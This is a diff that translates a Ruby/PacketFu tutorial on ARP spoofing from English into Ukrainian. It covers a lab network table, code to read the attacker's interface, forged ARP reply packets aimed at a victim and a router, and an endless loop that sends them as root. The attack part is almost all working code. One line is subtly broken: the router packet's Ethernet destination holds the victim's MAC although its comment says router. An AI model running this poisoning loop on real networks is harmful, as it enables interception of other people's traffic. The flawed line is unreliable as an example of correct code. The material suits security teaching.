@@ -4,25 +4,25 @@
 #### Сценарій
 В цьому сценарії у нас є три машини, розташовані як показано нижче:
 ```
-             |Attacker|
+             |Нападник|
                  |
                  ٧
-|Victim| -----------------> |Router| ---> Internet
+|Жертва| -----------------> |Роутер| ---> Інтернет
 ```
-Here the list of IP and MAC addresses of each of theme in the following table[^1]
+Список IP та MAC адрес кожної з них у наступній таблиці[^1]
 
-| Host/Info |   IP Address  |    MAC Address    |
+| Хост/Інфо |   IP Адреса   |    MAC Адреса     |
 |-----------|:-------------:|:-----------------:|
-| Attacker  | 192.168.0.100 | 3C:77:E6:68:66:E9 |
-| Victim    | 192.168.0.21  | 00:0C:29:38:1D:61 |
-| Router    | 192.168.0.1   | 00:50:7F:E6:96:20 |
+| Нападник  | 192.168.0.100 | 3C:77:E6:68:66:E9 |
+| Жертва    | 192.168.0.21  | 00:0C:29:38:1D:61 |
+| Роутер    | 192.168.0.1   | 00:50:7F:E6:96:20 |
 
-To know our/attacker's interface information
+Щоб отримати інформацію про наш інтерфейс(інтерфейс нападника) використаємо наступний код:
 
 ```ruby
 info = PacketFu::Utils.whoami?(:iface => "wlan0")
 ```
-returns a hash
+І він поверне щось типу:
 ```
 {:iface=>"wlan0",
  :pcapfile=>"/tmp/out.pcap",
@@ -34,41 +34,41 @@ returns a hash
  :eth_dst=>"\x00P\x7F\xE6\x96 ",
  :eth_daddr=>"00:50:7f:e6:96:20"}
 ```
-So you can extract these information like any hash `info[:iface]`, `info[:ip_saddr]`, `info[:eth_saddr]`, etc..
+Отже ви можете використовувати цю інформацію і брати її з хешів`info[:iface]`, `info[:ip_saddr]`, `info[:eth_saddr]`, і таке інше..
 
 
-**Building victim's ARP packet**
+**Побудова ARP пакету для жертви**
 ```ruby
-# Build Ethernet header
+# Створемо заголовки
 arp_packet_victim = PacketFu::ARPPacket.new
-arp_packet_victim.eth_saddr = "3C:77:E6:68:66:E9"       # our MAC address
-arp_packet_victim.eth_daddr = "00:0C:29:38:1D:61"       # the victim's MAC address
-# Build ARP Packet
-arp_packet_victim.arp_saddr_mac = "3C:77:E6:68:66:E9"   # our MAC address
-arp_packet_victim.arp_daddr_mac = "00:0C:29:38:1D:61"   # the victim's MAC address
-arp_packet_victim.arp_saddr_ip = "192.168.0.1"          # the router's IP
-arp_packet_victim.arp_daddr_ip = "192.168.0.21"         # the victim's IP
-arp_packet_victim.arp_opcode = 2                        # arp code 2 == ARP reply
+arp_packet_victim.eth_saddr = "3C:77:E6:68:66:E9"       # наша MAC адреса
+arp_packet_victim.eth_daddr = "00:0C:29:38:1D:61"       # MAC адреса жертви
+# Та додамо пакети
+arp_packet_victim.arp_saddr_mac = "3C:77:E6:68:66:E9"   # наша MAC адреса
+arp_packet_victim.arp_daddr_mac = "00:0C:29:38:1D:61"   # MAC адреса жертви
+arp_packet_victim.arp_saddr_ip = "192.168.0.1"          # IP роутера
+arp_packet_victim.arp_daddr_ip = "192.168.0.21"         # IP жертви
+arp_packet_victim.arp_opcode = 2                        # код  arp 2 це ARP відповідь
 ```
 
-**Building router packet**
+**Побудова пакету для роутера**
 ```ruby
-# Build Ethernet header
+# Створемо заголовки
 arp_packet_router = PacketFu::ARPPacket.new
-arp_packet_router.eth_saddr = "3C:77:E6:68:66:E9"       # our MAC address
-arp_packet_router.eth_daddr = "00:0C:29:38:1D:61"       # the router's MAC address
-# Build ARP Packet
-arp_packet_router.arp_saddr_mac = "3C:77:E6:68:66:E9"   # our MAC address
-arp_packet_router.arp_daddr_mac = "00:50:7F:E6:96:20"   # the router's MAC address
-arp_packet_router.arp_saddr_ip = "192.168.0.21"         # the victim's IP
-arp_packet_router.arp_daddr_ip = "192.168.0.1"          # the router's IP
-arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply
+arp_packet_router.eth_saddr = "3C:77:E6:68:66:E9"       # наша MAC адреса
+arp_packet_router.eth_daddr = "00:0C:29:38:1D:61"       # MAC адреса роутера
+# Та додамо ARP пакет
+arp_packet_router.arp_saddr_mac = "3C:77:E6:68:66:E9"   # наша MAC адреса
+arp_packet_router.arp_daddr_mac = "00:50:7F:E6:96:20"   # MAC адреса роутера
+arp_packet_router.arp_saddr_ip = "192.168.0.21"         # IP жертви
+arp_packet_router.arp_daddr_ip = "192.168.0.1"          # IP роутера
+arp_packet_router.arp_opcode = 2                        # код  arp 2 це ARP відповідь
 
 ```
 
-**Run ARP Spoofing attack**
+**Робимо спуфінг атаку на ARP**
 ```ruby
-# Send our packet through the wire
+# Відправляємо наш пакет у мережу
 while true
     sleep 1
     puts "[+] Sending ARP packet to victim: #{arp_packet_victim.arp_daddr_ip}"
@@ -77,9 +77,9 @@ while true
     arp_packet_router.to_w(info[:iface])
 end
 ```
-Source[^2]
+Джерело[^2]
 
-Wrapping all together and run as `root`
+Беремо все це разом і виконуємо від імені користувача `root`
 
 ```ruby
 #!/usr/bin/env ruby
